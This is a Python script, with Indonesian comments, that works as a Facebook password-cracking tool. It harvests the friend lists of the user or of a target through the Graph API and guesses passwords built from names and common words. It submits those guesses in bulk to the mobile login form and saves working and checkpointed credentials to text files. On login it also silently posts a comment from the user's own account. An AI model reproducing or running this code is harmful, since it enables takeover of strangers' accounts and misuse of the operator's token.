#Recod? Sertakan author
#Author : Latip176
#Facebook : Latip Harkat
import requests as req,json,time,pyfiglet,os
from concurrent.futures import ThreadPoolExecutor as Bool
from bs4 import BeautifulSoup as parser
try:ua=req.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip()
except req.exceptions.ConnectionError:exit("[!] Kesalahan Pada Koneksi")

try:
	title=pyfiglet.figlet_format("CRACK")
	teman=pyfiglet.figlet_format("TEMAN")
	publik=pyfiglet.figlet_format("PUBLIK")
except:os.system("pip install pyfiglet")

os.system("clear")
ok,cp,die=0,0,0
idTeman,idPublik=[],[]

class crack:
	
	def __init__(self,kontol):
		self.token=kontol
	def crackTeman(self,user,pw,ttl):
		global ok,cp,die
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in d.cookies:
			ok+=1
			open("live.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;32m[LIVE] {user} | {pw} | {ttl}         \x1b[0m",end="")
			print("")
		elif "checkpoint" in d.cookies:
			cp+=1
			open("check.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;33m[CHEK] {user} | {pw} | {ttl}      \x1b[0m",end="")
			print("")
		else:
			die+=1
		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
	def crackPub(self,user,pw,ttl):
		global ok,cp,die
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in d.cookies:
			ok+=1
			open("live.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;32m[LIVE] {user} | {pw} | {ttl}         \x1b[0m",end="")
			print("")
		elif "checkpoint" in d.cookies:
			cp+=1
			open("chek.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
			print(f"\r\x1b[1;33m[CHEK] {user} | {pw} | {ttl}      \x1b[0m",end="")
			print("")
		else:
			die+=1
		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
	def sendTeman(self):
		os.system("clear")
		print(teman+"\nFOLLOW IG : @latipharkat_ | STOP : CTRL + Z\n")
		crack(self.token).hitung1()
		with Bool(max_workers=35) as tokai:
			r=json.loads(req.get(f"https://graph.facebook.com/me/friends?access_token={self.token}").text)
			for i in r['data']:
				id=i['id']
				r2=json.loads(req.get(f"https://graph.facebook.com/{id}?access_token={self.token}").text)
				try:user=r2['username']
				except:pass
				try:ttl=r2['birthday']
				except:pass
				pas=[r2['first_name']+"123",r2['first_name']+"1234",r2['first_name']+"12345","Sayang","Sayang123","Bangsad","Bangsad123","Monyet","Monyet123","Doraemon","Doraemon123","Mantan","Mantan123","Anjing","Anjing123","Sukabumi",r2['last_name']+"123",r2['last_name']+"1234",r2['last_name']+"12345"]
				try:
					try:[tokai.submit(crack(self.token).crackTeman,user,pw,ttl) for pw in pas]
					except:[tokai.submit(crack(self.token).crackTeman,id,pw,ttl) for pw in pas]
				except:pass
		print(f"\nJumlah Dapet ok/cp : {cp} / {ok} save di file : live.txt / chek.txt\n")
		a=input("[KEMBALI]")
		crack(self.token).menu()
	def sendPublik(self):
		os.system("clear")
		print(publik+"\nFOLLOW IG : @latipharkat_ | STOP : CTRL + Z\n")
		try:
			target=input("[!] Masukan ID Target Teman/Publik : ")
			asu=json.loads(req.get(f"https://graph.facebook.com/{target}?access_token={self.token}").text)
			print("\n[+] Nama Target Publik :",asu['name'])
			crack(self.token).hitung2(target)
		except KeyError:
			print("[×] User Tersebut Tidak Ada")
			time.sleep(2)
			randy(self.token).menu()
		with Bool(max_workers=35) as tokai:
			r=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={self.token}").text)
			for i in r['data']:
				id=i['id']
				r2=json.loads(req.get(f"https://graph.facebook.com/{id}?access_token={self.token}").text)
				try:user=r2['username']
				except:pass
				try:ttl=r2['birthday']
				except:pass
				pas=[r2['first_name']+"123",r2['first_name']+"1234",r2['first_name']+"12345","Sayang","Sayang123","Bangsad","Bangsad123","Monyet","Monyet123","Doraemon","Doraemon123","Mantan","Mantan123","Anjing","Anjing123","Sukabumi",r2['last_name']+"123",r2['last_name']+"1234",r2['last_name']+"12345"]
				try:
					try:[tokai.submit(crack(self.token).crackPub,user,pw,ttl) for pw in pas]
					except:[tokai.submit(crack(self.token).crackPub,id,pw,ttl) for pw in pas]
				except:pass
		print(f"\nJumlah Dapet ok/cp : {cp} / {ok} save di file : live.txt / chek.txt\n")
		a=input("[KEMBALI]")
		crack(self.token).menu()
	def hitung1(self):
		r=json.loads(req.get(f"https://graph.facebook.com/me/friends?access_token={self.token}").text)
		for i in r['data']:
			id=i['id']
			idTeman.append(id)
		print("[+] Jumlah ID :",len(idTeman))
		time.sleep(2)
		print("[+] Crack Berjalan...\n")
	def hitung2(self,id):
		r=json.loads(req.get(f"https://graph.facebook.com/{id}/friends?access_token={self.token}").text)
		for i in r['data']:
			idTeman.append(id)
		print("[+] Jumlah ID :",len(idTeman))
		time.sleep(2)
		print("[+] Crack Berjalan...\n")
	def menu(self):
		os.system("clear")
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={self.token}").text)
		print(title+"\n=========================\nAUTHOR : Latip176\nFACEBOOK : Latip Harkat\nINSTAGRAM : @latipharkat_\n=+=+=+=+=+=+=+=+=+=+=+=+=\nUID :",r['id'],"\nNAMA :",r['name'],"\nTTL :",r['birthday'],"\n=========================\n[1]. CRACK TEMAN KITA\n[2]. CRACK ID PUBLIK\n[3]. HAPUS TOKEN\n")
		crack(self.token).pilihan()
	def pilihan(self):
		pilih=input("[?] Pilih Yang Mana : ")
		if pilih=="1":crack(self.token).sendTeman()
		elif pilih=="2":crack(self.token).sendPublik()
		elif pilih=="3":
			os.system("rm -rf tt.txt")
			exit("[√] HAPUS TOKEN BERHASIL")
		else:
			print("[×] Pilihan Tidak Ada")
			crack(self.token).pilihan()

def login():
	os.system("clear")
	a=pyfiglet.figlet_format("WELCOME")
	print(a+"\n============================\n[1]. Login Menggunakan Access Token\n[2]. Cara Mendapatkan Access Token (Dibawa Ke Google)\n============================\n")
	pilihan()
def pilihan():
	a=pyfiglet.figlet_format("LOGIN")
	pilih=input("[!] Masukan Pilihan Anda : ")
	if pilih in (""," ","  ","    ","     ","      ","       ","       "):
		print("[!] Jangan Kosong")
		pilihan()
	elif pilih=="1":
		os.system("clear")
		print(a+"\nJika Tidak Mempunyai Access Token Silahkan Cek Tutorialnya Di Menu Sebelumnya!\n")
		token=input("[!] Masukan Access Token Anda : ")
		try:
			r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={token}').text)
			os.system("clear")
			print("[√] Berhasil Login Ke Script\nNAMA AKUN FB :",r['name'])
			r2=req.post(f"https://graph.facebook.com/127034116090664/comments/?message=Aku Baboe Kamu Bang&access_token={token}")
			time.sleep(2)
			open('tt.txt','a').write(token)
			crack(token).menu()
		except KeyError:
			print("[×] Token Anda Salah")
			time.sleep(2)
			login()
	elif pilih=="2":
		os.system("xdg-open https://latipharkat.blogspot.com/2021/01/cara-mendapatkan-access-token-facebook.html?m=1")
	else:
		print("[!] Pilihan Tidak Ada")
		pilihan()
def logika():
	try:
		t=open("tt.txt","r").read()
		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={t}").text)
		print("[√] Anda Sudah Login\nNAMA AKUN :",r['name'])
		time.sleep(2)
		crack(t).menu()
	except KeyError:
		print("[!] Token Anda Invalid")
		os.system("rm -rf tt.txt")
		time.sleep(2)
		login()
	except FileNotFoundError:
		print("[×] Anda Belum Login")
		time.sleep(2)
		login()

if __name__=="__main__":
	logika()
